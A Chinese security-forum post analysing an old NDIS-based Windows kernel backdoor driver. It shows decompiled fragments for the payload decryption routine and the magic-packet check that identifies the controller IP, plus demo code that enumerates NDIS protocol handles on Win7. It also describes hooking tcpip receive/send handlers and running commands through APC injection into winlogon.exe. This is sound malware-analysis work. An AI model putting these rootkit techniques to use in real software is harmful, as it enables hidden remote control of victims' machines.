
# [分享]基于ndis 的驱动后门分析

前言

十年前的老样本总算梳理清楚了关键流程，趁有时间记录，分享一下。该样本是一个后门程序，通过劫持`tcp/ip`协议驱动的相关接口来实现网络通道的隐藏；使用用户模式`apc`加命名管道执行`cmd`，整个过程不需要单独的用户层程序协助。

## 1，样本信息

1).样本名称：`avcnet.sys`

2).md5：`42f43edc9937e4aa5f985773f5ea9daa`

3).是否加壳：没有（会内存解密载荷，再执行）

4).系统：32位

## 2,行为分析

1).内存释放驱动，并调用入口函数

2).注册`ndis protocol driver`来获取`tcp/ip`协议驱动的关键数据结构`NDIS_HANDLE`

3).对`tcp/ip`协议驱动的`receive`/`send`等处理函数进行替换

4).等待控制端发送的特殊数据包并处理

5).通过`apc`执行`cmd`命令并回收结果

6).其他

## 3，详细分析

1).驱动外层是个加载器，通过自定义的算法进行解密，然后在内存中加载真正的驱动文件。解密函数如下：

```
unsigned int \_\_usercall decode@<eax>(unsigned int \*a1@<edx>, int a2@<esi>)
{
unsigned int v2; // ecx
unsigned int result; // eax
int v4; // edi
unsigned int v5; // ebx
unsigned int v6; // [esp+8h] [ebp-4h]
v2 = \*a1;
result = a1[1];
v6 = -957401312;
do
{
v4 = \*(\_DWORD \*)(a2 + 4 \* ((v6 >> 11) & 3)) + ((16 \* v2) ^ (v2 >> 5));
v5 = v6;
v6 += 1640531527;
result -= (v2 ^ v5) + v4;
v2 -= (result ^ v6) + \*(\_DWORD \*)(a2 + 4 \* (v6 & 3)) + ((16 \* result) ^ (result >> 5));
}
while ( v6 );
\*a1 = v2;
a1[1] = result;
return result;
}
```

之后拿到解密的文件就可以静态分析。

2).通过注册协议驱动来获取`tcp/ip`协议驱动的关键数据结构。由于`NDIS_HANDLE`数据结构是未公开的，也就是说在不同版本的系统上一些数据字段的偏移不能保证一致。填充好相关数据结果，调用`NdisRegisterProtocol`，成功后就会返回一个协议驱动实例句柄（指向一个数据结构包含其关键信息，其中有一个字段是`_LIST_ENTRY`）；内核里面许多数据结构使用`_LIST_EBTRY`来链接起来，协议驱动也是这样的，通过这个结构来遍历得到目标`tcp/ip`的实例句柄。

![](upload/attach/202306/776304\_5K8BBTXJTXPTBF4.jpg)

下面以`win7 32`版本来模拟这一过程，demo如下：

```
/\*
只在win7 32 sp1 上测试有效，其他系统版本可能因为内部数据结构差异，存在问题.
具体的系统版本数据结构详细，可以参看NdisRegisterProtocol的内部实现
\*/
VOID mBindAdapterHandler(PNDIS\_STATUS status,NDIS\_HANDLE BindContext,PUNICODE\_STRING DeviceName,PVOID SystemSpecific1,PVOID SystemSpecific2)
{
}
VOID mUnbindAdapterHandler(PNDIS\_HANDLER,NDIS\_HANDLE,NDIS\_HANDLE)
{
}
NTSTATUS mReceiveHandler(NDIS\_HANDLE ProtocolBindingContext,NDIS\_HANDLE MacReceiveContext,PVOID HeaderBuffer,
UINT HeaderBufferSize,PVOID LookAheadBuffer,UINT LookaheadBufferSize,UINT PacketSize)
{
}
VOID mCloseAdapterCompleteHandler(NDIS\_HANDLE ProtocolBindingContext,NDIS\_STATUS status)
{
}
VOID mOpenAdapterCompleteHandler(NDIS\_HANDLE ProtocolBindingContext,NDIS\_STATUS Status,NDIS\_STATUS OpenErrorStatus)
{
}
VOID mRequestCompleteHandler(NDIS\_HANDLE ProtocolBindingContext,PNDIS\_REQUEST NdisRequest,NDIS\_STATUS Status)
{
}
VOID mResetCompleteHandler(NDIS\_HANDLE ProtocolBindingContext,NDIS\_STATUS Status)
{
}
VOID mStatusHandler(NDIS\_HANDLE ProtocolBindingContext,NDIS\_STATUS GeneralStatus,PVOID StatusBuffer,UINT statusBufferSize)
{
}
VOID mStatusCompleteHandler(NDIS\_HANDLE ProtocolBindingContext)
{
}
PNDIS\_HANDLE EnumRegisteredProtocol()
{
ULONG index=0;
UNICODE\_STRING DestinationString;
NDIS\_HANDLE NdisProtocolHandle,temp=NULL;
NDIS\_STATUS status;
NDIS\_PROTOCOL\_CHARACTERISTICS ProtocolCharacteristics;
PVOID funcs[13];
/\*
RECEIVE\_PACKET\_HANDLER ReceivePacketHandler;
BIND\_HANDLER mBindHandler;
UNBIND\_HANDLER mUnbindHandler;
PNP\_EVENT\_HANDLER PnpEventHandler;
UNLOAD\_PROTOCOL\_HANDLER mUnloadhanler;
PVOID ReservedHandler[4];
CO\_SEND\_COMPLETE\_HANDLER mCoSendCompleteHandler;
CO\_STATUS\_HANDLER mCoStatusHandler;
CO\_RECEIVE\_PACKET\_HANDLER mCoReceivePacketHandler;
CO\_AF\_REGISTER\_NOTIFY\_HANDLER mCoAfRegisterNotifyHandler;
\*/
status=STATUS\_SUCCESS;
NdisProtocolHandle=NULL;
memset(&ProtocolCharacteristics,0,0x6c);
RtlInitUnicodeString(&ProtocolCharacteristics.Name,KAPERSKY);
ProtocolCharacteristics.MajorNdisVersion=0x5;
ProtocolCharacteristics.MinorNdisVersion=0x0;
//ProtocolCharacteristics.Name.Length=DestinationString.Length;
//ProtocolCharacteristics.Name.Buffer=DestinationString.Buffer;
ProtocolCharacteristics.BindAdapterHandler=mBindAdapterHandler;
ProtocolCharacteristics.UnbindAdapterHandler=mUnbindAdapterHandler;
ProtocolCharacteristics.ReceiveHandler=mReceiveHandler;
ProtocolCharacteristics.CloseAdapterCompleteHandler=mCloseAdapterCompleteHandler;
ProtocolCharacteristics.OpenAdapterCompleteHandler=mOpenAdapterCompleteHandler;
ProtocolCharacteristics.RequestCompleteHandler=mRequestCompleteHandler;
ProtocolCharacteristics.StatusHandler=mStatusHandler;
ProtocolCharacteristics.StatusCompleteHandler=mStatusCompleteHandler;
// \*(BIND\_HANDLER\*)((ULONG)&ProtocolCharacteristics+0x38+0x4)=mBindAdapterHandler;
// \*(UNBIND\_HANDLER\*)((ULONG)&ProtocolCharacteristics+0x38+0x8)=mUnbindAdapterHandler;
NdisRegisterProtocol(&status,&NdisProtocolHandle,&ProtocolCharacteristics,0x6c);
if(STATUS\_SUCCESS==status)
{
//KdPrint(("addr of ProtocolCharacteristics.MajorVersion is 0x%x\n",ProtocolCharacteristics.MajorNdisVersion));
KdPrint(("begin to enum the ndisProtocolList.\n"));
if(NdisProtocolHandle!=NULL)
{
temp=NdisProtocolHandle;
do
{
KdPrint(("ProtocolDriverHandle is 0x%x ProtocolName is %wZ\n",(ULONG)temp,(PUNICODE\_STRING)((ULONG)temp+0x24)));
//KdPrint(("data NdisProtocolHandle+0x8 0x%x\n",\*(ULONG\*)((ULONG)NdisProtocolHandle+0x8)));
temp=(NDIS\_HANDLE)\*(ULONG\*)((ULONG)temp+0x8);//下一个ProtocolHandle
if(temp==NULL)
KdPrint(("ndisProtocolList is a SingleLinkedList!\n"));
}while(temp!=NULL&&temp!=NdisProtocolHandle);
NdisDeregisterProtocol(&status,NdisProtocolHandle);//注销协议
}
}
else
{
KdPrint(("RegisterProtocol fails,error is 0x%x\n",status));
}
return NULL;
}
```

demo效果如下图：

![](upload/attach/202306/776304\_X3YA4PEVM5GKE59.jpg)

3).找到`tcp/ip`协议驱动的实例句柄之后，对该数据结构中的关键函数进行替换。如下图：

![](upload/attach/202306/776304\_C59M5GCWJJ527GD.jpg)

成功替换`receive`/`send`相关函数之后，相对于在驱动中建立了网络通道，整个通信过程都在。

4).通过之前替换的`receive`函数对网络数据进行判断，从特定的包中确定控制端`ip`。下面通过汇编代码结合`wireshark`来分析其是如何确定控制端`ip`的：

首先，打开`wireshark`抓包看看相关数据特征：

![](upload/attach/202306/776304\_WSEQD5RRX5HW477.jpg)

上面有部分是带`ACK/FIN`字段的，后面显示`Len=0`，表示没有数据；只有`ethernet`,`ip`,`tcp`报头。找一个有数据的看看：

`ethernet header`占`0xe`字节，目标机器`mac`（6字节）+源机器`mac`（6字节）+`type`（后续协议类型，2字节）。常见的`type=0x800`，表示`IPv4`。

`ip header`，关键字段有版本号，`ip`报头长度，总长度（`ip header`+`tcp header`+`data`），协议号，源地址，目标地址；如下图所示：

![](upload/attach/202306/776304\_UX5QTHWRQEXG95B.jpg)

`tcp header`，关键字段有源端口号，目的端口号，载荷数据长度，序列号等，如下图所示：

![](upload/attach/202306/776304\_7HYSKMPXKJST5F7.jpg)

有了上面的非结构化数据作为参考，对照着看汇编代码太长，看`f5`后的就好理解：

```
int \_\_usercall GetRemoteAddress@<eax>(int a1@<eax>, unsigned int a2@<ecx>)
{
int v4; // edi
\_\_int16 v5; // dx
int v6; // ecx
int v7; // edx
int v8; // eax
\_DWORD \*v9; // eax
//ip header 一般长度大于0x14,20个字节
//检查 version，(0x0100),表示 IPv4
//6,表示协议号，指tcp协议
if ( a2 < 0x14 || (\*(\_BYTE \*)a1 & 0xF0) != 64 || \*(\_BYTE \*)(a1 + 9) != 6 )
return 0;
//因为实在receive处理函数中接受到的数据，
//所以本机相当于目的端，控制端的ip应该是从 源地址字段中取
v4 = \*(\_DWORD \*)(a1 + 12);
if ( v4 && v4 == RemoteAddress )
return 0;
HIBYTE(v5) = \*(\_BYTE \*)(a1 + 6);
LOBYTE(v5) = \*(\_BYTE \*)(a1 + 7);
//检查Flags，0x4000,表示 Don't fragment
if ( (v5 & 0x3FFF) != 0 && (v5 & 0x1FFF) != 0 )
return 0;
v6 = \*(\_BYTE \*)a1 & 0xF;
v7 = a1 + 4 \* v6;
v8 = \*(unsigned \_\_int8 \*)(v7 + 12) >> 4;
//tcp 数据长度要大于0x10
if ( a2 - 4 \* (v8 + v6) < 0x10 )
return 0;
//获取tcp 数据偏移
v9 = (\_DWORD \*)(v7 + 4 \* v8);
//校验tcp 数据特征
if ( (\*v9 ^ v9[2]) != 1168870401 || (v9[1] ^ v9[3]) != 610279017 || !v4 )
return 0;
RemoteAddress = v4;
return 1;
```

5).`cmd`的执行是通过插入用户模式的`apc`到`winlogon.exe`进程中，然后通过命名管道读取回显。用户模式的`apc`使用，就是常规的线程选择，内存申请，写入（映射）`shellcode`。主要是它读取回显的方式比较新颖，之前一直是在用户层使用命名管道来实现进程间的通信，它这个实现了驱动与进程之间的通信。以下示例`demo`演示了驱动中使用命名管道的方法：
